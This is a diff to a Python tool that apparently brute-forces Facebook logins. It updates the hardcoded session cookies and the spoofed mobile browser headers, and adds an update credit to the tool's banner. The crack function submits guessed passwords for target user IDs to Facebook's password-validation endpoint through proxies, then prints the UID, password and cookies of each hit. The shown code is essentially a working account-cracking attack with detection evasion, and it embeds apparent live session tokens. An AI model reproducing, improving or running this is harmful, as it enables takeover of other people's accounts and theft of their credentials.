@@ -3,31 +3,40 @@ from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import requests
 cookies = {
-    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
-    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
-    'locale': 'fa_IR',
-    'vpd': 'v1%3B737x393x2.75',
-    'wd': '393x737',
-    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
+    'datr': '25a8ZZRH1c5ViiGrbFgYISE3',
+    'sb': '25a8Ze8reha5oWQ6EfZbFjJw',
+    'ps_n': '0',
+    'ps_l': '0',
+    'vpd': 'v1%3B720x393x2.75',
+    'wl_cbv': 'v2%3Bclient_version%3A2424%3Btimestamp%3A1709393060',
+    'locale': 'en_US',
+    'fr': '06vyUtMmdsqwTeBYB.AWVEa9hVJ0rHopbbdwxgvcWseko.BlvJbb..AAA.0.0.Bl7BLP.AWXgJaZ0e5U',
+    'wd': '393x720',
+    'zsh': 'ASTTE9IAlrXgM1hG4Wru-ONeZmshpF4zqgnRcd_AlyUgbqmucjvNYMg0VB0EpwR4QWfAXQI5R2ga-HQKL5hzoY1t16mDpBigQayaeY5sDbduK0zcVEptRyIh38Dahy3smZfRdNefyh5VjjOCLQem05hlyQPPIiOc2UFp77Pnoz7D2Z9z_CrB8qLM_mpyugSOSG1KVtdtFHjHxYJFNJFUNp0fnQkiYXkS0YUMyjLRPvijSw6R_enQE9kU6gubSl_2iqDwSmWdInLMf1FNjhdKHZ2LM89llTQcTTZEuR9KwVkF11XMo6p5V71JBTA0jLahi1I8',
 }
 
 headers = {
     'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
-    'origin': 'https://mbasic.facebook.com',
-    'referer': 'https://mbasic.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    # 'cookie': 'datr=25a8ZZRH1c5ViiGrbFgYISE3; sb=25a8Ze8reha5oWQ6EfZbFjJw; ps_n=0; ps_l=0; vpd=v1%3B720x393x2.75; wl_cbv=v2%3Bclient_version%3A2424%3Btimestamp%3A1709393060; locale=en_US; fr=06vyUtMmdsqwTeBYB.AWVEa9hVJ0rHopbbdwxgvcWseko.BlvJbb..AAA.0.0.Bl7BLP.AWXgJaZ0e5U; wd=393x720; zsh=ASTTE9IAlrXgM1hG4Wru-ONeZmshpF4zqgnRcd_AlyUgbqmucjvNYMg0VB0EpwR4QWfAXQI5R2ga-HQKL5hzoY1t16mDpBigQayaeY5sDbduK0zcVEptRyIh38Dahy3smZfRdNefyh5VjjOCLQem05hlyQPPIiOc2UFp77Pnoz7D2Z9z_CrB8qLM_mpyugSOSG1KVtdtFHjHxYJFNJFUNp0fnQkiYXkS0YUMyjLRPvijSw6R_enQE9kU6gubSl_2iqDwSmWdInLMf1FNjhdKHZ2LM89llTQcTTZEuR9KwVkF11XMo6p5V71JBTA0jLahi1I8',
+    'dpr': '2.75',
+    'referer': 'https://mbasic.facebook.com/login/save-password-interstitial/?ref_component=mbasic_footer&ref_page=%2Fwap%2Fhome.php&refid=8&paipv=0&eav=AfaDJ6HA5ld_ZHBRiIqUUcHj92EXFPYilrlXyeQVppcWTy-GxQXUSaFC7PeqOyoI7ik',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
 }
 
 params = {
@@ -231,6 +240,7 @@ def banner():
                                           
 
 \x1b[1;92m｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡\x1b[1;91m
+𝐔𝐏𝐃𝐀𝐓𝐄 𝐁𝐘 @l4m_rawa🔥
 𝔸𝕌𝕋ℍ𝕆ℝ ➙hama404
 ℂℍ𝔸ℕ𝔼𝕃 ➙@hama404
 𝕋𝔼𝕃𝔼𝔾ℝ𝔸𝕄 ➙@   hama404
@@ -420,7 +430,31 @@ def crack(idf,pwv):
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			heade = {'authority': 'm.facebook.com',
+    'method': 'GET',
+	'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'content-type':'application/x-www-form-urlencoded',
+    'origin':'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r\r\n{x}[ {m}hama ^-CP {x}]\n{m}YEAR-FB{x}:{m} {tahun(idf)}\n{m}UID{x}:{m} {idf}\n{m}PASS{x}:{m} {pw}\n{m}COOKIES{x}:{m} {kuki} ')
